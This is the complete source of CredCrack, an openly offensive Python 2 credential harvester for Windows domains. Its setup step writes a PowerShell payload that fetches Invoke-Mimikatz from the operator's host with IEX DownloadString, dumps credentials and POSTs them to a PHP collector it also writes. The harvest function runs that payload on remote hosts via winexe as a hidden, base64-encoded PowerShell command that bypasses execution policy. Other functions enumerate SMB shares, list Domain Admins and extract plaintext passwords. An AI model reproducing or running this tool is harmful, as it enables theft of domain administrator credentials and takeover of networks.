#!/usr/bin/env python2

# CredCrack - A fast and stealthy credential harvester
# This script harvests credentials for any given IP(s) and
# notifies one when domain administrator credentials have
# been captured. The harvester functionality is limited to 
# systems running Windows and Powershell version 2+ 
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
# Author:  Jonathan Broche
# Email:   jb@gojhonny.com
# Twitter: @g0jhonny
# Version: 1.1
# Date:    2015-08-26

import subprocess, os, argparse, time, datetime, socket, base64, threading, Queue, hashlib, binascii, signal, sys, getpass
from shlex import split
from shutil import rmtree, copy

harvested_hosts = []

class colors:
    lightblue = "\033[1;36m"
    lightgrey = "\033[0;37m"
    blue = "\033[1;34m"
    normal = "\033[0;00m"
    red = "\033[1;31m"
    yellow = "\033[1;33m"
    white = "\033[1;37m"
    green = "\033[1;32m"

class LoginFailure(Exception): pass

#----------------------------------------#
#               SETUP                    #
#----------------------------------------#

def setup(lhost):
    print "{}[*]{} Setting up the stage".format(colors.blue, colors.normal)

    if not os.path.exists('/var/www/Invoke-Mimikatz.ps1'):
        print "{}[!]{} Dependency not met. Please download Invoke-Mimikatz.ps1 and store it in /var/www".format(colors.red, colors.normal)
        print "{}[!]{} wget https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -O /var/www/Invoke-Mimikatz.ps1\n".format(colors.red, colors.normal)
        return False

    funps = """
    IEX (New-Object Net.WebClient).DownloadString('http://{lh}/Invoke-Mimikatz.ps1');
    $creds = Invoke-Mimikatz -DumpCreds;
    $request = [System.Net.WebRequest]::Create('http://{lh}/creds.php');
    $request.Method = "POST";
    $request.ContentType = "application/x-www-form-urlencoded";
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
    $request.ContentLength = $bytes.Length;
    $requestStream = $request.GetRequestStream();
    $requestStream.Write( $bytes, 0, $bytes.Length );
    $requestStream.Close();
    $request.GetResponse();
    """.format(lh=lhost)

    credsphp = """
    <?php
    $file = '/tmp/CCloot/'.$_SERVER['REMOTE_ADDR'];
    $post_body = file_get_contents('php://input');
    printf('putting contents into '.$file);
    file_put_contents($file, $post_body);
    ?>
    """

    with open ('/var/www/creds.php', 'w') as f:
        f.write(credsphp)
    with open ('/var/www/fun.ps1', 'w') as f:
        f.write(funps)

    if not os.path.exists('/tmp/CCloot'):
        os.makedirs('/tmp/CCloot')
        os.chmod('/tmp/CCloot', 0707)

    try: 
        apache_status = subprocess.check_output(split("ps -A"))

        if 'apache2' not in apache_status:
            subprocess.Popen(split('service apache2 start'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
        return True
 
    except Exception as e:
        print "{}[!]{} Error trying to start Apache. {}".format(colors.red, colors.normal, e)
        return False

#----------------------------------------#
#         VALIDATE IP                    #
#----------------------------------------#

def validate(rhost):
    try:
        print "{}[*]{} Validating {}".format(colors.blue, colors.normal, rhost)
        if socket.inet_aton(rhost):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((rhost, 445)) #test if 445 is open on the remote host
            s.close()
            return True
        
    except socket.error as e:
        print "{}[!]{} Unable to connect to {}".format(colors.red, colors.normal, rhost)
        return False

#----------------------------------------#
#          ENUM SHARE ACCESS             #
#----------------------------------------#

def enum_shares(q, username, password, domain):
    lock = threading.Lock()
    try:
        while True:
            with lock:
                os = ''
                shares, endshares = [], []
                rhost = q.get()

                #obtain available shares
                process = subprocess.Popen(split("smbclient -L //{} -U '{}/{}%{}'".format(rhost, domain, username, password)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

                for line in filter(None, process.communicate()[0].split('\n')):
                    share = line.strip('\t')
                    if 'os=' in share.lower():
                        os = share.split(']')[1][5:] #operating system
                    else:
                        if any(badline in share for badline in ["Connection to", "NetBIOS", "None", "------"]): #filter bad lines
                            pass
                        else:
                            for item in share.split(' '):
                                if any(badshare in share for badshare in ["Printer", "IPC", ""]): #filter printer & ipc shares
                                    if 'Disk' in item:
                                        es = ' '.join(share.split(' ')[:share.split(' ').index(item)]).strip()
                                        if es not in shares: 
                                            shares.append(es)
                
                #test share accessibility
                for share in shares:
                    process = subprocess.Popen(split("smbclient //{}/'{}' -U '{}/{}%{}' -c dir".format(rhost, share, domain, username, password)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

                    if [item for item in filter(None, process.communicate()[0].split('\n')) if "NT_STATUS" in item]: #if NT_STATUS in response => closed share/error
                        endshares.append(" CLOSED    \\\\{}\\{} ".format(rhost, share))
                    else:
                        endshares.append(" {}OPEN      \\\\{}\\{}{} ".format(colors.lightgrey, rhost, share, colors.normal))

                if endshares:
                    print "\n " + "-" * 65 + "\n " + colors.normal + "{} - {} \n ".format(rhost, os) + "-" * 65 + "\n "
                    for share in endshares:
                        print share
                else: print "{}[!]{} No shares to list on {}. Ensure the correct password was used.".format(colors.red, colors.normal, rhost)
            q.task_done()
                   
    except Exception as e:
        print "{}[!]{} Error listing shares on {}: {}".format(colors.red, colors.normal, rhost, e)
        q.task_done()

#----------------------------------------#
#         GET DOMAIN ADMINS              #
#----------------------------------------#

def get_das(rhost, username, password, domain):
    das = []
       
    try:
        print "{}[*]{} Querying domain admin group from {}".format(colors.blue, colors.normal, rhost.rstrip())
        process = subprocess.Popen(split("winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'".format(rhost, domain, username, password)), stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = process.stdout.read()
        error = process.stderr.read()

        if any(err in error for err in ["NT_STATUS_LOGON_FAILURE", "NT_STATUS_ACCOUNT_LOCKED_OUT"]):
            raise LoginFailure(error.strip())
        else:
            da_output = output.replace("The command completed successfully.","").split()[output.split().index("Members")+2:]
            if da_output:        
                for da in da_output:
                    if da:
                        das.append(da.strip())
                return das

    except LoginFailure as e:
        print "{}[!]{} {}".format(colors.red, colors.normal, e)       
        sys.exit(os.EX_OSERR)
    except Exception as e:
        if "'Members' is not in list" in e:
            print "{}[!]{} User is not an admin on {} or the system is not joined to a domain".format(colors.red, colors.normal, rhost)
        else:
            print "{}[!]{} Failed to obtain domain admin list from {}: {}".format(colors.red, colors.normal, rhost, e)
        return False

#----------------------------------------#
#         HARVEST CREDENTIALS            #
#----------------------------------------#

def harvest(q, username, password, domain, lhost):
    lock = threading.Lock()
    
    try:
        while True:
            rhost = q.get()
            if rhost in harvested_hosts:
                q.task_done()
               
            with lock:
                print "{}[*]{} Harvesting credentials from {}".format(colors.blue, colors.normal, rhost)
                harvested_hosts.append(rhost)
                encoded_cmd = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://{}/fun.ps1')".format(lhost).encode('utf_16_le'))
                process = subprocess.Popen(split("winexe --system //{} -U {}/{}%{} 'cmd /c echo . | powershell.exe -w hidden -Exec Bypass -noni -nop -enc {}'".format(rhost, domain, username, password, encoded_cmd)), stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                error = process.stderr.read()
                if error and "NT_STATUS_ACCESS_DENIED" in error: raise Exception("NT_STATUS_ACCESS_DENIED")

                timeout = 20
                while timeout > 0:
                    status = process.poll()
                    if status is None:
                        time.sleep(0.1)
                        timeout -=0.1
                    else:
                        break

                if timeout <=0:
                    print "{}[!]{} Timed out harvesting credentials from {}".format(colors.red, colors.normal, rhost)
                    process.terminate()
            q.task_done()

    except OSError:
        pass
    except Exception as e:
        print "{}[!]{} Error harvesting credentials from {}: {}".format(colors.red, colors.normal, rhost, e)
        q.task_done()

#----------------------------------------#
#         PARSE LOOT                     #
#----------------------------------------#

def parse_loot():
    files = next(os.walk('/tmp/CCloot'))[2]
    credentials = []

    for fi in files: #parse all files within the CCloot directory
        with open (os.path.join('/tmp/CCloot', fi)) as f:
            lines = f.readlines()
            for i in [x for x, y in enumerate(lines) if 'wdigest' in y]:
                if 'username' in lines[i+1].lower() and not any(x in lines[i+1].lower() for x in ['$', '(null)']): #if username does not have $ or null
                    if lines[i+3][15:].rstrip() != '(null)': #if password is not null
                        domain, user, pw = lines[i+2][15:].rstrip(), lines[i+1][15:].rstrip(), lines[i+3][15:].rstrip()
                        if [u for r, d, u, p in credentials if user in u]: #omitting duplicate credentials
                            pass
                        else:
                            credentials.append((fi, domain, user, pw)) #add credentials
    return credentials

#----------------------------------------#
#               OUTPUT                   #
#----------------------------------------#
   
def output(credentials, das):
    da_counter = 0
  
    try:
        if credentials:
            print """\n
                  {lg}The loot has arrived...{y}
                         __________
                        /\____;;___\    
                       | /         /    
                       `. ())oo() .      
                        |\(%()*^^()^\       
                       %| |-%-------|       
                      % \ | %  ))   |       
                      %  \|%________|       

                {n}""".format(lg=colors.lightgrey, y=colors.yellow, n=colors.normal)

            with open ('/tmp/CCloot/l00t', 'w') as f:
                f.write("\n " + "-" * 69 + "\n " + " CredCrack Loot \n " + "-" * 69 + "\n\n")
                for cred in credentials:
                    if cred[2] in das and cred[2] != "Administrator":
                        #d = domain, #u = username, #p = password
                        print "{y}[*] Host: {r} Domain: {d} User: {u}   Password: {p}{n}".format(y=colors.yellow, r=cred[0], d=cred[1], u=cred[2], p=cred[3], n=colors.normal)
                        f.write("[*] Host: {r} Domain: {d} User: {u} Password: {p} {y}-- Domain Admin{n}\n".format(r=cred[0], d=cred[1], u=cred[2], p=cred[3], y=colors.yellow, n=colors.normal))
                        da_counter+=1
                    else:
                        print "{w}[*]{lg} Host: {r} Domain: {d} User: {u} Password: {p}{n}".format(w=colors.white, lg=colors.lightgrey, r=cred[0], d=cred[1], u=cred[2], p=cred[3], n=colors.normal)
                        f.write("[*] Host: {r} Domain: {d} User: {u} Password: {p}\n".format(r=cred[0], d=cred[1], u=cred[2], p=cred[3])) 
                if da_counter:
                    print "\n     {y}{dac}{n} domain administrators found and highlighted in yellow above!\n".format(y=colors.yellow, dac=da_counter, n=colors.normal)
                return True
        else:
            print "\n{red}[!]{n} No Loot?! Argh!\n".format(red=colors.red, n=colors.normal)
            return False
    except Exception as e:
        print '{red}[!]{n} Error outputting loot. {exc}'.format(red=colors.red, n=colors.normal, exc=e)

#----------------------------------------#
#               CLEAN UP                 #
#----------------------------------------#

def clean_up(flag, stime):
    print "\n{}[*]{} Cleaning up".format(colors.blue, colors.normal)
    try:
        if flag: #script completed successfully
            os.remove(os.path.join('/var/www', 'creds.php'))
            os.remove(os.path.join('/var/www', 'fun.ps1'))

            if os.path.exists(os.path.join(os.getenv('HOME'), 'CCloot')):
                dirname = os.path.join(os.getenv('HOME'), 'CCloot_{}'.format(datetime.datetime.now().strftime('%Y%m%d_%H:%M:%S')))
                os.rename('/tmp/CCloot', dirname )
                os.chmod(dirname, 0700)                
            else:
                dirname = os.path.join(os.getenv('HOME'), 'CCloot')
                os.rename('/tmp/CCloot', dirname)
                os.chmod(dirname, 0700)
            subprocess.Popen(split('service apache2 stop'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
            print "{}[*]{} Done! Loot may be found under {} folder{}".format(colors.green, colors.white, dirname, colors.normal)
            print "{}[*]{} Completed in {:.1f}s\n".format(colors.blue, colors.normal, time.time()- stime)
        else: #script did not complete successfully
            subprocess.Popen(split('service apache2 stop'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
            if os.path.exists('/tmp/CCloot'):
                rmtree('/tmp/CCloot')
            if os.path.exists('/var/www/fun.ps1'): os.remove('/var/www/fun.ps1')
            if os.path.exists('/var/www/creds.php'): os.remove('/var/www/creds.php')
    except Exception as e:
        print "{}[!]{} Error cleaning up. {}".format(colors.red, colors.normal, e)

#----------------------------------------#
#               MAIN                     #
#----------------------------------------#

def main():   

    example = "Examples: \n\n./credcrack.py -d acme -u bob -f hosts -es\n./credcrack.py -d acme -u bob -f hosts -l 192.168.1.102 -t 20"
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, description="CredCrack - A stealthy credential harvester by Jonathan Broche (@g0jhonny)", epilog=example)
    required = parser.add_argument_group("Required")
    required.add_argument('-d', '--domain', required=True, help='Domain or Workstation')
    required.add_argument('-u', '--user', required=True, help='Domain username')
    action = parser.add_mutually_exclusive_group(required=True)
    action.add_argument('-f', '--file', help='File containing IPs to harvest creds from. One IP per line.')
    action.add_argument('-r', '--rhost', help='Remote host IP to harvest creds from.')
    parser.add_argument('-es', '--enumshares', help='Examine share access on the remote IP(s)', action='store_true')
    parser.add_argument('-l', '--lhost', help='Local host IP to launch scans from.')
    parser.add_argument('-t', '--threads', help='Number of threads (default: 10)', default=10, type=int)
    args = parser.parse_args()
    args.passwd = getpass.getpass()

    print "\n " + "-" * 69 + "\n " + colors.white + " CredCrack v1.1 by Jonathan Broche (@g0jhonny)\n " + colors.normal + "-" * 69 + "\n "

    stime = time.time()
    das, credentials, badhost = [], [], []
    q = Queue.Queue(maxsize=0)

    try:
        if not args.passwd:
            print "{}[!]{} Please provide a password\n".format(colors.red, colors.normal)
            return

        if args.enumshares:
            if args.rhost:
                if validate(args.rhost):
                    q.put(args.rhost)
            elif args.file:
                with open (args.file) as f:
                    lines = [ip.strip() for ip in f.readlines() if ip.strip() and validate(ip.strip())]
                for line in lines:
                    q.put(line)
            if q.queue:
                for i in range(args.threads):
                    worker = threading.Thread(target=enum_shares, args=(q, args.user, args.passwd, args.domain))
                    worker.setDaemon(True)
                    worker.start()
                q.join()
            print "\n{}[*]{} Done! Completed in {:.1f}s\n".format(colors.green, colors.normal, time.time()- stime)
        else:
            if args.lhost:
                if setup(args.lhost):
                    if args.rhost:
                        if validate(args.rhost):
                            das = get_das(args.rhost, args.user, args.passwd, args.domain)
                            q.put(args.rhost)
                    if args.file:
                        with open (args.file) as f:
                            lines = [ip.strip() for ip in f.readlines() if ip.strip() and validate(ip.strip())]
                            for line in lines:
                                das = get_das(line, args.user, args.passwd, args.domain)
                                if not das: #put the host on a bad list
                                    badhost.append(lines[lines.index(line)])
                                else: #we got our domain admin list
                                    if badhost: #if badhosts, filter before queue
                                        for good_ip in [ip for ip in lines if ip not in badhost]:
                                            q.put(good_ip)
                                    else: #only good hosts? put them in the queue!
                                        for good_ip in lines:
                                            q.put(good_ip)
                                    break
                    if das:
                        for num in range(args.threads):
                            worker = threading.Thread(target=harvest, args=(q, args.user, args.passwd, args.domain, args.lhost))
                            worker.setDaemon(True)
                            worker.start()
                        q.join()
                    
                        if output(parse_loot(), das):
                            clean_up(True, stime)
                        else:
                            clean_up(False, stime)
                    else:
                        clean_up(False, stime)
            else:
                print "{}[!]{} Provide the IP address of the local host [-l]\n".format(colors.red, colors.normal)

    except (KeyboardInterrupt, SystemExit):
        print "\n{}[!]{} Terminating script".format(colors.yellow, colors.normal)
        clean_up(False, stime)      
    except IOError:
        print "{}[!]{} File: {} does not exist.".format(colors.red, colors.normal, args.file)
        clean_up(False, stime)
if __name__ == '__main__':
    main()